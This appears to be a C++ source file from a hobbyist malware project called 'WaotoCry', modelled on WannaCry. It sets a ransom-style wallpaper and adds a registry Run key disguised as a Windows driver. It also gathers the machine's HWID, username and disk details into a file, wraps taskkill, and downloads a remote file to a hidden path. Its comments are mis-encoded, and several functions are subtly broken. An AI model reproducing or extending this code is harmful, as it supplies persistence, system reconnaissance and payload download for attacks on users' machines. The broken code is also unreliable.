#include "include/API.h"
#include "include/API-2.h"

ofstream ofs;
ifstream ifs;

string wstring2string(wstring wstr)
{
    string result;
    //��ȡ��������С��������ռ䣬��������С�°��ֽڼ����  
    int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL);
    char* buffer = new char[len + 1];
    //���ֽڱ���ת���ɶ��ֽڱ���  
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL);
    buffer[len] = '\0';
    //ɾ��������������ֵ  
    result.append(buffer);
    delete[] buffer;
    return result;
}


//����ϵͳ����
void system_information_table() {
    const char* path = "C:\\Users\\ASUS\\Pictures\\CG\\WannaCry����.jpg";
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path, SPIF_SENDCHANGE);
}


string text_box_auto() {
    string email_text_book = "�ɹ�ֲ��������";
    string email_text_neirong = "FTP����ʱ��������";
    return email_text_book+email_text_neirong;
}


 
 string HWID = GetHWID();   //HWID
 string windows_user = windows_username();      //username
 string system_box = system_information();          //disk
 string system_text = system_information_text();    //filetype



void fstream_double() {
	ofs.open("C:\\Windows sys\\computer_box.txt", ios::out);
	ofs << "������û�����:" <<windows_username<< endl;
    ofs << "�豸HWID:" << HWID << endl;
    ofs << "��������:" <<system_box <<endl;
    ofs << "�ļ�ϵͳ��" <<system_text<< endl;
}


//����������
string userlc;
//����������
void AutoStart()
{
    
    char Driver[MAX_PATH];
    HKEY hKey;
    string userlc = _pgmptr;
    string exe_name = "WaotoCry.exe";
    string ff_path = userlc + exe_name;
    cout << ff_path << endl;
    strcpy(Driver, ff_path.c_str());
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

//exepath
void exe_path() {
    cout << _pgmptr << endl;
}


//kill pro
void kill_process(string kill_name) {
    char kali_name=0;
    kill_name = kali_name;
    char message[1000];
    memset(message, 0, 200);
    char kill_target[] = "taskklii /f /t /im %c";
    sprintf_s(message, kill_target, kali_name);
    system(message);
}

//ifstream_open_read
void ifsteam_open_read() {
    ifs.open("C:\\Windows sys\\computer_box.txt", ios::in);
    if (!ifs.is_open())
    {
        cout << "�ļ���ʧ��" << endl;
        return;
    }
    char c;
    while ((c = ifs.get()) != EOF)
    {
        cout << c;
    }
    ifs.close();
}

//GetVolumelnformationȫ�ֲ���




void c_box_information() {
    TCHAR szvolumename[260] = { 0 };
    DWORD dwvolumeserialnumber = 0;
    DWORD dwmaxvolumename = 0;
    DWORD dwfilesystemflgs = 0;
    TCHAR szfilesystemname[260] = { 0 };
    GetVolumeInformation(_T("C:\\"), szvolumename, 260, &dwvolumeserialnumber, &dwmaxvolumename, &dwfilesystemflgs, szfilesystemname, 260);
    //printf("������ƣ�%s\n������кţ�%x\n�ļ�������󳤶ȣ�%d\n�ļ�ϵͳ��ʶ��%x\n�ļ�ϵͳ����:%s",
    //    szvolumename, dwvolumeserialnumber, dwmaxvolumename, dwfilesystemflgs, szfilesystemname);
    cout << "������ƣ�"<< szvolumename <<endl;
    cout << "������кţ�" << dwvolumeserialnumber << endl;
    cout << "�ļ�������󳤶ȣ�" << dwmaxvolumename << endl;
    cout << "�ļ�ϵͳ��ʶ��" << dwfilesystemflgs << endl;
    cout << "�ļ�ϵͳ����" << szfilesystemname << endl;

   /* TCHAR VolumeNameBuffer[MAX_PATH + 1], FileSystemNameBuffer[MAX_PATH];
    DWORD VolumeSerialNumber, MaximumComponentLength, FileSystemFlags;
    GetVolumeInformation(_T("C:\\"), VolumeNameBuffer, MAX_PATH + 1, &VolumeSerialNumber, &MaximumComponentLength, &FileSystemFlags, FileSystemNameBuffer, MAX_PATH + 1);*/
    
}
   
//system_dike_name

string system_information() {
    char szVolumeNameBuf[MAX_PATH] = { 0 };
    DWORD dwVolumeSerialNum;
    DWORD dwMaxComponentLength;
    DWORD dwSysFlags;
    char szFileSystemBuf[MAX_PATH] = { 0 };
    DWORD dwFileSystemBuf = MAX_PATH;

    BOOL bGet = GetVolumeInformationA("C:\\",
        szVolumeNameBuf,
        MAX_PATH,
        &dwVolumeSerialNum,
        &dwMaxComponentLength,
        &dwSysFlags,
        szFileSystemBuf,
        MAX_PATH);
    return szVolumeNameBuf;
}

string system_information_text() {
    char szVolumeNameBuf[MAX_PATH] = { 0 };
    DWORD dwVolumeSerialNum;
    DWORD dwMaxComponentLength;
    DWORD dwSysFlags;
    char szFileSystemBuf[MAX_PATH] = { 0 };
    DWORD dwFileSystemBuf = MAX_PATH;

    BOOL bGet = GetVolumeInformationA("C:\\",
        szVolumeNameBuf,
        MAX_PATH,
        &dwVolumeSerialNum,
        &dwMaxComponentLength,
        &dwSysFlags,
        szFileSystemBuf,
        MAX_PATH);
    return szFileSystemBuf;
}

/*struct GPU_information
{
    string 
}*/; 




//����ģ��
void download(string usl) {
    string download_usl = usl;
    size_t len = download_usl.length();//��ȡ�ַ�������
    int nmlen = MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, NULL, 0);
    wchar_t* buffer = new wchar_t[nmlen];
    MultiByteToWideChar(CP_ACP, 0, download_usl.c_str(), len + 1, buffer, nmlen);
    HRESULT hr = URLDownloadToFile(NULL, buffer, _T("F:\\$windows_sys\\��ԭ��.jpg"), 0, NULL);
    if (hr == S_OK)
    {
        setcolor(2);
        cout << "�ļ����سɹ���" << endl;
        setcolor(15);
    }
    else
    {
        setcolor(12);
        cout << "�ļ�����ʧ�ܣ�" << endl;
        setcolor(15);
    }
   
}